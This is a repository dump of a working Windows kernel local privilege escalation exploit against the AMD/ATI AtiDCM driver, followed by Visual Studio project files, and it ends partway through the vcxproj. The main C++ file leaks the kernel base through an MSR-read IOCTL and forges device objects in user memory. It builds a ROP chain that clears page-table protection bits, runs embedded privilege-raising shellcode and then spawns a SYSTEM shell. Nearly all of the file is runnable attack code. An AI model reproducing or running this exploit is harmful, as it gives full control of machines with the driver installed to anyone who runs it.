Project Path: arc_MrAle98_ATDCM64a-LPE_ltt49uv9

Source Tree:

```txt
arc_MrAle98_ATDCM64a-LPE_ltt49uv9
├── DrvExpTemplate.cpp
├── DrvExpTemplate.sln
├── DrvExpTemplate.vcxproj
├── DrvExpTemplate.vcxproj.filters
├── README.md
├── deploy.ps1
├── disable_ssl.ps1
├── env.bat
├── pass.txt
└── scp.bat

```

`DrvExpTemplate.cpp`:

```cpp
#include <iostream>
#include <windows.h>

char shellcode[] =
//<increment privileges with cleanup>
//"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x10\x48\x89\xC8\xC3";


//<increment privileges with cleanup and rax = 0>
//"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x18\x48\x89\xC8\xC3";

//<increment privileges with cleanup and rax = 0 and final wbinvd>
"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x20\x48\x89\xC8\xC3";







typedef struct _IO_TIMER* PIO_TIMER;
typedef short CSHORT;
#define DEVICE_TYPE ULONG;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5
#define NT_BASE 0xfffff80025a00000


DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;

typedef struct _VPB {
	CSHORT Type;
	CSHORT Size;
	USHORT Flags;
	USHORT VolumeLabelLength; // in bytes
	struct _DEVICE_OBJECT* DeviceObject;
	struct _DEVICE_OBJECT* RealDevice;
	ULONG SerialNumber;
	ULONG ReferenceCount;
	WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, * PVPB;

typedef enum _IO_ALLOCATION_ACTION {
	KeepObject = 1,
	DeallocateObject,
	DeallocateObjectKeepRegisters
} IO_ALLOCATION_ACTION, * PIO_ALLOCATION_ACTION;

typedef
_Function_class_(DRIVER_CONTROL)
_IRQL_requires_same_
IO_ALLOCATION_ACTION
DRIVER_CONTROL(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp,
	_In_ PVOID MapRegisterBase,
	_In_ PVOID Context
);
typedef DRIVER_CONTROL* PDRIVER_CONTROL;

typedef struct _KDEVICE_QUEUE_ENTRY {
	LIST_ENTRY DeviceListEntry;
	ULONG SortKey;
	BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, * PKDEVICE_QUEUE_ENTRY, * PRKDEVICE_QUEUE_ENTRY;

typedef struct _WAIT_CONTEXT_BLOCK {
	union {
		KDEVICE_QUEUE_ENTRY WaitQueueEntry;
		struct {
			LIST_ENTRY DmaWaitEntry;
			ULONG NumberOfChannels;
			ULONG SyncCallback : 1;
			ULONG DmaContext : 1;
			ULONG ZeroMapRegisters : 1;
			ULONG Reserved : 9;
			ULONG NumberOfRemapPages : 20;
		};
	};
	PDRIVER_CONTROL DeviceRoutine;
	PVOID DeviceContext;
	ULONG NumberOfMapRegisters;
	PVOID DeviceObject;
	PVOID CurrentIrp;
	PVOID BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, * PWAIT_CONTEXT_BLOCK;

typedef struct _KDPC {
	union {
		ULONG TargetInfoAsUlong;
		struct {
			UCHAR Type;
			UCHAR Importance;
			volatile USHORT Number;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;

	SINGLE_LIST_ENTRY DpcListEntry;
	KAFFINITY ProcessorHistory;
	PVOID DeferredRoutine;
	PVOID DeferredContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	__volatile PVOID DpcData;
} KDPC, * PKDPC, * PRKDPC;


typedef struct _KDEVICE_QUEUE {
	CSHORT Type;
	CSHORT Size;
	LIST_ENTRY DeviceListHead;
	KSPIN_LOCK Lock;

#if defined(_AMD64_)

	union {
		BOOLEAN Busy;
		struct {
			LONG64 Reserved : 8;
			LONG64 Hint : 56;
		};
	};

#else

	BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, * PKDEVICE_QUEUE, * PRKDEVICE_QUEUE;

typedef struct _DISPATCHER_HEADER {
	union {
		union {
			volatile LONG Lock;
			LONG LockNV;
		} DUMMYUNIONNAME;

		struct {                            // Events, Semaphores, Gates, etc.
			UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
			UCHAR Signalling;
			UCHAR Size;
			UCHAR Reserved1;
		} DUMMYSTRUCTNAME;

		struct {                            // Timer
			UCHAR TimerType;
			union {
				UCHAR TimerControlFlags;
				struct {
					UCHAR Absolute : 1;
					UCHAR Wake : 1;
					UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
				} DUMMYSTRUCTNAME;
			};

			UCHAR Hand;
			union {
				UCHAR TimerMiscFlags;
				struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

					UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

					UCHAR Index : 1;
					UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

					UCHAR Inserted : 1;
					volatile UCHAR Expired : 1;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;
		} DUMMYSTRUCTNAME2;

		struct {                            // Timer2
			UCHAR Timer2Type;
			union {
				UCHAR Timer2Flags;
				struct {
					UCHAR Timer2Inserted : 1;
					UCHAR Timer2Expiring : 1;
					UCHAR Timer2CancelPending : 1;
					UCHAR Timer2SetPending : 1;
					UCHAR Timer2Running : 1;
					UCHAR Timer2Disabled : 1;
					UCHAR Timer2ReservedFlags : 2;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR Timer2ComponentId;
			UCHAR Timer2RelativeId;
		} DUMMYSTRUCTNAME3;

		struct {                            // Queue
			UCHAR QueueType;
			union {
				UCHAR QueueControlFlags;
				struct {
					UCHAR Abandoned : 1;
					UCHAR DisableIncrement : 1;
					UCHAR QueueReservedControlFlags : 6;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR QueueSize;
			UCHAR QueueReserved;
		} DUMMYSTRUCTNAME4;

		struct {                            // Thread
			UCHAR ThreadType;
			UCHAR ThreadReserved;

			union {
				UCHAR ThreadControlFlags;
				struct {
					UCHAR CycleProfiling : 1;
					UCHAR CounterProfiling : 1;
					UCHAR GroupScheduling : 1;
					UCHAR AffinitySet : 1;
					UCHAR Tagged : 1;
					UCHAR EnergyProfiling : 1;
					UCHAR SchedulerAssist : 1;

#if !defined(_X86_)

					UCHAR ThreadReservedControlFlags : 1;

#else

					UCHAR Instrumented : 1;

#endif

				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			union {
				UCHAR DebugActive;

#if !defined(_X86_)

				struct {
					BOOLEAN ActiveDR7 : 1;
					BOOLEAN Instrumented : 1;
					BOOLEAN Minimal : 1;
					BOOLEAN Reserved4 : 2;
					BOOLEAN AltSyscall : 1;
					BOOLEAN UmsScheduled : 1;
					BOOLEAN UmsPrimary : 1;
				} DUMMYSTRUCTNAME;

#endif

			} DUMMYUNIONNAME2;
		} DUMMYSTRUCTNAME5;

		struct {                         // Mutant
			UCHAR MutantType;
			UCHAR MutantSize;
			BOOLEAN DpcActive;
			UCHAR MutantReserved;
		} DUMMYSTRUCTNAME6;
	} DUMMYUNIONNAME;

	LONG SignalState;                   // Object lock
	LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;


typedef struct _KEVENT {
	DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT, * PRKEVENT;

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
	CSHORT Type;
	USHORT Size;
	LONG ReferenceCount;
	struct _DRIVER_OBJECT* DriverObject;
	struct _DEVICE_OBJECT* NextDevice;
	struct _DEVICE_OBJECT* AttachedDevice;
	struct _IRP* CurrentIrp;
	PIO_TIMER Timer;
	ULONG Flags;                                // See above:  DO_...
	ULONG Characteristics;                      // See ntioapi:  FILE_...
	__volatile PVPB Vpb;
	PVOID DeviceExtension;
	ULONG DeviceType;
	CCHAR StackSize;
	union {
		LIST_ENTRY ListEntry;
		WAIT_CONTEXT_BLOCK Wcb;
	} Queue;
	ULONG AlignmentRequirement;
	KDEVICE_QUEUE DeviceQueue;
	KDPC Dpc;

	//
	//  The following field is for exclusive use by the filesystem to keep
	//  track of the number of Fsp threads currently using the device
	//

	ULONG ActiveThreadCount;
	PSECURITY_DESCRIPTOR SecurityDescriptor;
	KEVENT DeviceLock;

	USHORT SectorSize;
	USHORT Spare1;

	struct _DEVOBJ_EXTENSION* DeviceObjectExtension;
	PVOID  Reserved;

} DEVICE_OBJECT;

typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;



#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;

void printBuffer(PCHAR buf,char* name,SIZE_T size) {
	printf("%s:\n", name);
	for (int i = 0; i < size; i++) {
		printf("buf[%d] = 0x%x\n", i,buf[i]);
	}

}

BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	*((DWORD*)inputBuffer) = msr_value;

	if (inputBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
	

	DWORD bytesRet = 0;

	
	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_READMSR,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_READMSR \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

unsigned int ExtractPml4Index(PVOID address)
{
	return ((uintptr_t)address >> 39) & 0x1ff;
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		21,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	char* object = (char*)VirtualAlloc(
		(LPVOID)(0x0000001afeffe000),
		0x12000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	printf("[+] object = 0x%p\n", object);
	object = (char*)(0x1aff000000 - 0x30);
	printf("[+] second object = 0x%p\n", object);

	PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

	memset(object, 0x41, 0x30);

	printf("[+] ptr = 0x%p\n", ptr);
	char* object2 = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
	memset(object2, 0x43, 0x30);

	char* driverObject = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memset(driverObject, 0x50, SIZE_BUF);
	printf("[+] driverObject = 0x%p\n", driverObject);
	char* ptrDriver = driverObject + 0x30;
	char* pDriverFunction = ptrDriver + 0x1b*8+0x70;

	*((PDWORD64)pDriverFunction) = g_ntbase+ 0x40ac03;   //mov esp, ebx; ret

	ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);

	
	memset(ptr->AttachedDevice, 0x42, SIZE_BUF-0x40);
	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;

	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);
	
	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000feffe000, 0x12000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	if (fake_stack == 0) {
		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
		exit(0);
	}
	printf("[*] fake_stack = 0x%p\n", fake_stack);

	PULONGLONG ropStack = (PULONGLONG)fake_stack + 0x2000;

	if (!VirtualLock((char*)ropStack - 0x3000, 0x10000)) {
		printf("[-] virtualLock failed with error: %d\n", GetLastError());
		exit(0);
	}

	memset(fake_stack, 0x41, 0x12000);
	
	printf("[+] VirtualLock returned successfully\n");

	printf("[*] ropStack = 0x%p\n", ropStack);
	DWORD index = 0;


	char* scbase = (char*)VirtualAlloc((LPVOID)0x1a1a1a000000, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!VirtualLock(scbase, 0x5000)) {
		printf("[-] virtualLock failed with error: %d\n", GetLastError());
		exit(0);
	}
	memset(scbase, 0x42, 0x5000);
	char* sc = scbase + 0x3500;
	memcpy(sc, shellcode, sizeof(shellcode));


	unsigned int pml4shellcode_index = ExtractPml4Index(sc);
	printf("[*] sc = 0x%p\n", sc);
	printf("[*] pml4shellcode_index 0x%p\n", pml4shellcode_index);

	//<get base from nt!MiGetPteAddress+0x13>
	ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
	ropStack[index] = g_ntbase + 0x2abaf7; index++; // address of nt!MiGetPteAddress+0x13
	ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr [rax]; ret;
	//<get base from nt!MiGetPteAddress+0x13>

	//<get pml4Index>
	ropStack[index] = g_ntbase + 0x34bb9c; index++; // pop rdx; ret;
	ropStack[index] = 0x1ff; index++; // 0x1ff
	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
	ropStack[index] = g_ntbase + 0x38738b; index++;//shr rax, 3; ret;
	ropStack[index] = g_ntbase + 0x358532; index++;// and rax, rdx; ret;
	//<get pml4index> now pml4index in rax

	//<move pml4index in rcx>
	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
	ropStack[index] = (ULONGLONG)&ropStack[index + 3]; index++;
	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
	ropStack[index] = 0x4141414141414141; index++;//dummy
	//<mov pml4index in rcx>

	//<get pml4 address>
	ropStack[index] = g_ntbase + 0x203beb; index++;// pop rax; ret;
	ropStack[index] = 0xffff; index++;
	//first round
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
	//second round
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
	//third round
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
	//fourth round
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
	//fifth round
	ropStack[index] = g_ntbase + 0x322d1b; index++;// shl rax, 0xc; ret;
	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
	ropStack[index] = (DWORD64)pml4shellcode_index * 8; index++;
	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
	//<get pml4 address> pml4 address in rax
	
	//<clean owner bit O=S position 2>
	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
	ropStack[index] = 0x2; index++;
	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
	//<clean owner bit O=S position 2>

	//<clean NX bit position 63>
	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
	ropStack[index] = 63; index++;
	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
	//<clean NX bit position 63>

	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;

	//<shellcode>
	ropStack[index] = (ULONGLONG)sc; index++;

	//<cleanup>
	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
	ropStack[index] = g_ntbase + 0x3d4cba; index++; // xor rax, rax; ret;
	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
	ropStack[index] = g_ntbase + 0x20505a; index++; // pop rsp; ret;
	ropStack[index] = 0x4141414141414141; index++; // filled with rsp value
	//<cleanup>

#ifdef _DEBUG
	for (int i = 0; i < index; i++) {
		printf("ropStack[%d] %p : 0x%p\n", i, &ropStack[i], ropStack[i]);
	}
#endif
	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
	ptr->AttachedDevice->AttachedDevice = 0;
	char* ptr2 = inputBuffer;
	*(ptr2) = 0;
	ptr2 += 1;
	*((PDWORD64)ptr2) = (DWORD64)ptr;
	

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

	DWORD bytesRet = 0;

	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_ARBITRARYCALLDRIVER,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

int main()
{
#ifndef _DEBUG
	DWORD bytesRet = 0;


	g_device = CreateFileA(
		"\\\\.\\AtiDCM",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);



	if (g_device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%8p\n", g_device);
#endif
	char* outputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);


	memset(outputBuffer, 0x0, SIZE_BUF);

#ifndef DEBUG

	//if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
	//	printf("[+] readMSR success.\n");
	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer+12)));
	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
	//	/*printBuffer(outputBuffer, (char*)"outputBuffer", SIZE_BUF);*/
	//}

	if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
		//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
		g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
	}
#endif

	arbitraryCallDriver(outputBuffer, SIZE_BUF);
	printf("[+] arbitraryCallDriver returned successfully.\n");
	printf("[*] spawning system shell...\n");
	system("cmd.exe");
	return 0;
}
```

`DrvExpTemplate.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.32929.386
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DrvExpTemplate", "DrvExpTemplate.vcxproj", "{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Debug|x64.ActiveCfg = Debug|x64
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Debug|x64.Build.0 = Debug|x64
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Debug|x86.ActiveCfg = Debug|Win32
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Debug|x86.Build.0 = Debug|Win32
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Release|x64.ActiveCfg = Release|x64
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Release|x64.Build.0 = Release|x64
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Release|x86.ActiveCfg = Release|Win32
		{411FF9D7-0201-49A1-9FAE-0AD2D392D7C8}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {02285A74-FD7D-431D-9226-A682DD4C2EE2}
	EndGlobalSection
EndGlobal

```

`DrvExpTemplate.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{411ff9d7-0201-49a1-9fae-0ad2d392d7c8}</ProjectGuid>
    <RootNamespace>DrvExpTemplate</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <ExecutablePath>$(ProjectName)$(ProjectName);$(ExecutablePath)</ExecutablePath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
